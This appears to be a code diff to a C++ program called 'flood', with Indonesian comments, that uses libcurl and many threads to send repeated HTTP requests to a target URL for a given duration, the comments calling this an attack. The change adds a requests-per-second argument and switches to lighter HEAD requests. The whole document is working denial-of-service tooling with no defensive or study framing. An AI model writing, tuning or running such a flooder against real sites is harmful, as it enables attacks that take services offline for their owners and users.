@@ -12,6 +12,7 @@ void sendRequest(const std::string& target) {
     curl = curl_easy_init();
     if (curl) {
         curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
+        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // Hanya HEAD request (opsional, agar lebih ringan)
         res = curl_easy_perform(curl);
 
         if (res != CURLE_OK) {
@@ -22,30 +23,27 @@ void sendRequest(const std::string& target) {
 }
 
 int main(int argc, char* argv[]) {
-    if (argc < 3) {
-        std::cout << "Invalid Usage: ./flood URL DURATION" << std::endl;
+    if (argc < 4) {
+        std::cout << "Invalid Usage: ./flood URL DURATION REQUESTS_PER_SECOND" << std::endl;
         return 1;
     }
 
     std::string target = argv[1];  // URL Target
     int duration = std::stoi(argv[2]);  // Durasi serangan (dalam detik)
+    int requestsPerSecond = std::stoi(argv[3]); // Jumlah request per detik
 
     // Inisialisasi libcurl
     curl_global_init(CURL_GLOBAL_DEFAULT);
 
-    // Tentukan jumlah request per interval
-    int requestsPerInterval = 2000;
-
-    // Simulasikan serangan dengan memanfaatkan thread untuk mengirim request
     auto start = std::chrono::high_resolution_clock::now();
     auto end = start + std::chrono::seconds(duration);
 
     while (std::chrono::high_resolution_clock::now() < end) {
         std::vector<std::thread> threads;
 
-        // Mengirimkan 1500 request dalam setiap batch
-        for (int i = 0; i < requestsPerInterval; ++i) {
-            threads.push_back(std::thread(sendRequest, target));  // Mengirim request di thread terpisah
+        // Kirim request sesuai jumlah per detik
+        for (int i = 0; i < requestsPerSecond; ++i) {
+            threads.push_back(std::thread(sendRequest, target));
         }
 
         // Tunggu semua thread selesai
@@ -53,8 +51,8 @@ int main(int argc, char* argv[]) {
             t.join();
         }
 
-        // Delay sebentar sebelum mengirim batch berikutnya
-        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        // Tunggu hingga 1 detik sebelum batch selanjutnya
+        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
     }
 
     // Cleanup libcurl
